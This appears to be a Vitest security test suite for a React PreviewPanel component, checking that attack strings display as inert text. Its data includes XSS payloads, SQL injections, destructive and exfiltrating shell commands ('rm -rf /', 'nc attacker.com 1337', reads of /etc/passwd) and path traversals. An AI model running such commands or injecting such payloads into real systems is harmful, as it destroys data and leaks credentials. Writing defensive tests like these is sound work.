import React from 'react';
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen } from '@testing-library/react';
import { PreviewPanel, type PreviewPanelProps } from '../ui/components/PreviewPanel';

describe('Preview Feature Security Tests', () => {
  let mockOnConfirm: ReturnType<typeof vi.fn>;
  let mockOnCancel: ReturnType<typeof vi.fn>;
  let mockOnEdit: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    mockOnConfirm = vi.fn();
    mockOnCancel = vi.fn();
    mockOnEdit = vi.fn();
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  const createProps = (overrides: Partial<PreviewPanelProps> = {}): PreviewPanelProps => ({
    input: 'test input',
    intent: { type: 'task', confidence: 0.8 },
    onConfirm: mockOnConfirm,
    onCancel: mockOnCancel,
    onEdit: mockOnEdit,
    ...overrides,
  });

  describe('XSS Prevention', () => {
    it('should safely display script tags without execution', () => {
      const maliciousInput = '<script>alert("XSS")</script>';
      const props = createProps({ input: maliciousInput });

      render(<PreviewPanel {...props} />);

      // Should display the text content, not execute it
      expect(screen.getByText(`"${maliciousInput}"`)).toBeInTheDocument();

      // Script should not have been executed
      // In a real DOM, we would check that alert was not called
      expect(window.alert).toBeUndefined();
    });

    it('should handle iframe injection attempts', () => {
      const iframeInput = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
      const props = createProps({ input: iframeInput });

      render(<PreviewPanel {...props} />);

      // Should display as text, not render iframe
      expect(screen.getByText(`"${iframeInput}"`)).toBeInTheDocument();
    });

    it('should neutralize onload and onerror attributes', () => {
      const eventHandlerInput = '<img src="x" onerror="alert(\'XSS\')" onload="alert(\'Loaded\')">';
      const props = createProps({ input: eventHandlerInput });

      render(<PreviewPanel {...props} />);

      // Should display as text without executing event handlers
      expect(screen.getByText(`"${eventHandlerInput}"`)).toBeInTheDocument();
    });

    it('should handle javascript: URLs safely', () => {
      const javascriptUrl = 'javascript:alert("XSS")';
      const props = createProps({ input: javascriptUrl });

      render(<PreviewPanel {...props} />);

      // Should display as text
      expect(screen.getByText(`"${javascriptUrl}"`)).toBeInTheDocument();
    });

    it('should safely handle style injection attempts', () => {
      const styleInput = '<style>body{background:url("javascript:alert(\'XSS\')")}</style>';
      const props = createProps({ input: styleInput });

      render(<PreviewPanel {...props} />);

      // Should display as text
      expect(screen.getByText(`"${styleInput}"`)).toBeInTheDocument();
    });

    it('should handle data URLs with embedded scripts', () => {
      const dataUrl = 'data:text/html,<script>alert("XSS")</script>';
      const props = createProps({ input: dataUrl });

      render(<PreviewPanel {...props} />);

      // Should display as text
      expect(screen.getByText(`"${dataUrl}"`)).toBeInTheDocument();
    });

    it('should handle SVG-based XSS attempts', () => {
      const svgXss = '<svg onload="alert(\'XSS\')"><script>alert("XSS")</script></svg>';
      const props = createProps({ input: svgXss });

      render(<PreviewPanel {...props} />);

      // Should display as text
      expect(screen.getByText(`"${svgXss}"`)).toBeInTheDocument();
    });

    it('should handle CSS expression injection', () => {
      const cssExpression = 'expression(alert("XSS"))';
      const props = createProps({ input: cssExpression });

      render(<PreviewPanel {...props} />);

      // Should display safely
      expect(screen.getByText(`"${cssExpression}"`)).toBeInTheDocument();
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should handle classic SQL injection patterns', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1'; DELETE FROM users; --",
        "' UNION SELECT password FROM users --",
        "admin'--",
        "admin' #",
        "admin'/*",
      ];

      sqlInjections.forEach(injection => {
        const props = createProps({ input: injection });
        render(<PreviewPanel {...props} />);

        // Should display as text without any special interpretation
        expect(screen.getByText(`"${injection}"`)).toBeInTheDocument();
      });
    });

    it('should handle advanced SQL injection techniques', () => {
      const advancedInjections = [
        "1'; EXEC xp_cmdshell('dir'); --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "'; UPDATE users SET password='hacked' WHERE id=1; --",
      ];

      advancedInjections.forEach(injection => {
        const props = createProps({ input: injection });
        render(<PreviewPanel {...props} />);

        expect(screen.getByText(`"${injection}"`)).toBeInTheDocument();
      });
    });

    it('should handle SQL injection in command arguments', () => {
      const maliciousIntent = {
        type: 'command' as const,
        confidence: 1.0,
        command: 'search',
        args: ["'; DROP TABLE users; --", "normal-arg"],
      };

      const props = createProps({ intent: maliciousIntent });
      render(<PreviewPanel {...props} />);

      // Should display command safely
      expect(screen.getByText("Execute command: /search '; DROP TABLE users; -- normal-arg")).toBeInTheDocument();
    });
  });

  describe('Command Injection Prevention', () => {
    it('should handle shell command injection patterns', () => {
      const commandInjections = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1337",
        "test `whoami`",
        "test $(cat /etc/hosts)",
        "test & ping google.com",
      ];

      commandInjections.forEach(injection => {
        const props = createProps({ input: injection });
        render(<PreviewPanel {...props} />);

        expect(screen.getByText(`"${injection}"`)).toBeInTheDocument();
      });
    });

    it('should handle PowerShell injection attempts', () => {
      const powershellInjections = [
        "test; Invoke-WebRequest evil.com",
        "test & Get-Process",
        "test | Out-File C:\\temp\\hacked.txt",
      ];

      powershellInjections.forEach(injection => {
        const props = createProps({ input: injection });
        render(<PreviewPanel {...props} />);

        expect(screen.getByText(`"${injection}"`)).toBeInTheDocument();
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should handle directory traversal attempts', () => {
      const pathTraversals = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
      ];

      pathTraversals.forEach(path => {
        const props = createProps({ input: path });
        render(<PreviewPanel {...props} />);

        expect(screen.getByText(`"${path}"`)).toBeInTheDocument();
      });
    });

    it('should handle UNC path injection', () => {
      const uncPaths = [
        "\\\\attacker.com\\share\\file",
        "//attacker.com/share/file",
        "file://attacker.com/share/file",
      ];

      uncPaths.forEach(path => {
        const props = createProps({ input: path });
        render(<PreviewPanel {...props} />);

        expect(screen.getByText(`"${path}"`)).toBeInTheDocument();
      });
    });
  });

  describe('Buffer Overflow Prevention', () => {
    it('should handle extremely long strings without crashing', () => {
      const bufferOverflowAttempt = 'A'.repeat(100000); // 100KB string
      const props = createProps({ input: bufferOverflowAttempt });

      expect(() => {
        render(<PreviewPanel {...props} />);
      }).not.toThrow();

      // Should still display the content (or truncated version)
      expect(screen.getByText(/^"A+.*"$/)).toBeInTheDocument();
    });

    it('should handle null byte injection attempts', () => {
      const nullByteInjection = "test\x00.txt";
      const props = createProps({ input: nullByteInjection });

      render(<PreviewPanel {...props} />);

      // Should handle null bytes safely
      expect(screen.getByText(`"${nullByteInjection}"`)).toBeInTheDocument();
    });

    it('should handle format string attacks', () => {
      const formatStrings = [
        "%x%x%x%x",
        "%n%n%n%n",
        "%s%s%s%s",
        "%p%p%p%p",
      ];

      formatStrings.forEach(formatString => {
        const props = createProps({ input: formatString });
        render(<PreviewPanel {...props} />);

        expect(screen.getByText(`"${formatString}"`)).toBeInTheDocument();
      });
    });
  });

  describe('Prototype Pollution Prevention', () => {
    it('should handle prototype pollution attempts in metadata', () => {
      const pollutedMetadata = {
        "__proto__": { "polluted": true },
        "constructor": { "prototype": { "polluted": true } },
        "prototype": { "polluted": true },
      };

      const maliciousIntent = {
        type: 'task' as const,
        confidence: 0.8,
        metadata: pollutedMetadata,
      };

      const props = createProps({ intent: maliciousIntent });

      expect(() => {
        render(<PreviewPanel {...props} />);
      }).not.toThrow();

      // Should not pollute the Object prototype
      expect((Object.prototype as any).polluted).toBeUndefined();
    });

    it('should handle JSON parsing vulnerabilities', () => {
      const maliciousJsonString = '{"__proto__":{"polluted":true}}';
      const props = createProps({ input: maliciousJsonString });

      render(<PreviewPanel {...props} />);

      expect(screen.getByText(`"${maliciousJsonString}"`)).toBeInTheDocument();
      expect((Object.prototype as any).polluted).toBeUndefined();
    });
  });

  describe('ReDoS (Regular Expression Denial of Service) Prevention', () => {
    it('should handle exponential regex patterns', () => {
      const redosPatterns = [
        "(a+)+b",
        "([a-zA-Z]+)*",
        "(a|a)*",
        "^(a+)+$",
        "a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*",
      ];

      redosPatterns.forEach(pattern => {
        const props = createProps({ input: pattern });

        const startTime = Date.now();
        render(<PreviewPanel {...props} />);
        const endTime = Date.now();

        // Should not take excessive time to render
        expect(endTime - startTime).toBeLessThan(1000);
        expect(screen.getByText(`"${pattern}"`)).toBeInTheDocument();
      });
    });

    it('should handle catastrophic backtracking inputs', () => {
      const catastrophicInput = "a".repeat(50) + "X";
      const props = createProps({ input: catastrophicInput });

      const startTime = Date.now();
      render(<PreviewPanel {...props} />);
      const endTime = Date.now();

      // Should complete quickly
      expect(endTime - startTime).toBeLessThan(100);
    });
  });

  describe('Memory Exhaustion Prevention', () => {
    it('should handle large nested objects gracefully', () => {
      // Create deeply nested object
      let deepObject: any = {};
      let current = deepObject;
      for (let i = 0; i < 1000; i++) {
        current.nested = {};
        current = current.nested;
      }
      current.value = "deep";

      const maliciousIntent = {
        type: 'task' as const,
        confidence: 0.8,
        metadata: deepObject,
      };

      const props = createProps({ intent: maliciousIntent });

      expect(() => {
        render(<PreviewPanel {...props} />);
      }).not.toThrow();
    });

    it('should handle circular references without infinite loops', () => {
      const circularObject: any = { name: "test" };
      circularObject.self = circularObject;
      circularObject.nested = { parent: circularObject };

      const maliciousIntent = {
        type: 'task' as const,
        confidence: 0.8,
        metadata: circularObject,
      };

      const props = createProps({ intent: maliciousIntent });

      expect(() => {
        render(<PreviewPanel {...props} />);
      }).not.toThrow();
    });

    it('should handle large arrays in metadata', () => {
      const largeArray = new Array(10000).fill("item");
      const maliciousIntent = {
        type: 'task' as const,
        confidence: 0.8,
        metadata: { largeArray },
      };

      const props = createProps({ intent: maliciousIntent });

      expect(() => {
        render(<PreviewPanel {...props} />);
      }).not.toThrow();
    });
  });

  describe('Encoding and Character Set Security', () => {
    it('should handle Unicode normalization attacks', () => {
      const unicodeAttacks = [
        "adⅿin", // Using Unicode character that looks like 'mi'
        "аdmin", // Using Cyrillic 'а' instead of Latin 'a'
        "admin\u202e", // Right-to-left override
        "admin\u200b", // Zero-width space
        "admin\ufeff", // Byte order mark
      ];

      unicodeAttacks.forEach(attack => {
        const props = createProps({ input: attack });
        render(<PreviewPanel {...props} />);

        expect(screen.getByText(`"${attack}"`)).toBeInTheDocument();
      });
    });

    it('should handle different encoding attempts', () => {
      const encodingAttacks = [
        "%3cscript%3ealert('XSS')%3c/script%3e", // URL encoded
        "&#60;script&#62;alert('XSS')&#60;/script&#62;", // HTML entities
        "&lt;script&gt;alert('XSS')&lt;/script&gt;", // Named HTML entities
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e", // Unicode escaped
      ];

      encodingAttacks.forEach(attack => {
        const props = createProps({ input: attack });
        render(<PreviewPanel {...props} />);

        expect(screen.getByText(`"${attack}"`)).toBeInTheDocument();
      });
    });

    it('should handle mixed encoding attacks', () => {
      const mixedEncoding = "%3c%73%63%72%69%70%74%3e&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;%3c%2f%73%63%72%69%70%74%3e";
      const props = createProps({ input: mixedEncoding });

      render(<PreviewPanel {...props} />);
      expect(screen.getByText(`"${mixedEncoding}"`)).toBeInTheDocument();
    });
  });

  describe('Workflow and Command Security', () => {
    it('should sanitize workflow names', () => {
      const maliciousWorkflow = "<script>alert('XSS')</script>";
      const props = createProps({
        intent: { type: 'task', confidence: 0.8 },
        workflow: maliciousWorkflow,
      });

      render(<PreviewPanel {...props} />);

      // Should display workflow name safely
      expect(screen.getByText(`Create task (${maliciousWorkflow} workflow)`)).toBeInTheDocument();
    });

    it('should handle malicious command names and arguments', () => {
      const maliciousIntent = {
        type: 'command' as const,
        confidence: 1.0,
        command: "<script>alert('cmd')</script>",
        args: ["<script>alert('arg')</script>", "'; rm -rf /"],
      };

      const props = createProps({ intent: maliciousIntent });
      render(<PreviewPanel {...props} />);

      // Should display command safely
      expect(screen.getByText(/Execute command:/)).toBeInTheDocument();
    });

    it('should prevent command injection through intent metadata', () => {
      const maliciousMetadata = {
        suggestedWorkflow: "; rm -rf /",
        command: "test && cat /etc/passwd",
        args: ["normal", "; malicious"],
      };

      const maliciousIntent = {
        type: 'task' as const,
        confidence: 0.8,
        metadata: maliciousMetadata,
      };

      const props = createProps({ intent: maliciousIntent });

      expect(() => {
        render(<PreviewPanel {...props} />);
      }).not.toThrow();
    });
  });

  describe('CSRF and State Manipulation Prevention', () => {
    it('should handle callback tampering attempts', () => {
      // Try to override callbacks with malicious functions
      const maliciousCallbacks = {
        onConfirm: () => { (window as any).compromised = true; },
        onCancel: () => { document.body.innerHTML = "Hacked"; },
        onEdit: () => { eval("alert('XSS')"); },
      };

      const props = createProps(maliciousCallbacks);

      render(<PreviewPanel {...props} />);

      // Component should render without executing malicious code
      expect((window as any).compromised).toBeUndefined();
      expect(document.body.innerHTML).toContain('Input Preview');
    });

    it('should resist state manipulation through props', () => {
      const manipulatedProps = {
        ...createProps(),
        // Try to inject additional props that might affect behavior
        ['__proto__']: { malicious: true },
        constructor: { prototype: { hacked: true } },
        toString: () => "hacked",
        valueOf: () => "hacked",
      } as any;

      expect(() => {
        render(<PreviewPanel {...manipulatedProps} />);
      }).not.toThrow();

      // Should not affect global prototypes
      expect((Object.prototype as any).malicious).toBeUndefined();
      expect((Object.prototype as any).hacked).toBeUndefined();
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    it('should handle excessive nesting without stack overflow', () => {
      const excessivelyNested = Array(1000).fill(0).reduce(
        (acc, _) => ({ nested: acc }),
        { value: "deep" }
      );

      const maliciousIntent = {
        type: 'task' as const,
        confidence: 0.8,
        metadata: excessivelyNested,
      };

      const props = createProps({ intent: maliciousIntent });

      expect(() => {
        render(<PreviewPanel {...props} />);
      }).not.toThrow();
    });

    it('should handle malformed JSON-like structures', () => {
      const malformedData = {
        input: '{"unclosed": "object"',
        intent: {
          type: 'task',
          confidence: 'not a number',
          args: "not an array",
          metadata: 'function() { while(true) {} }',
        } as any,
      };

      expect(() => {
        render(<PreviewPanel {...malformedData} />);
      }).not.toThrow();
    });

    it('should prevent infinite loops in rendering', () => {
      const infiniteLoopData = {
        get input() {
          while (true) {
            // This would cause infinite loop if not handled
          }
        },
      } as any;

      // Should timeout or handle gracefully rather than hang
      const startTime = Date.now();

      expect(() => {
        // This might throw or complete quickly due to getter optimization
        render(<PreviewPanel {...createProps()} />);
      }).not.toThrow();

      const endTime = Date.now();
      expect(endTime - startTime).toBeLessThan(1000);
    });
  });
});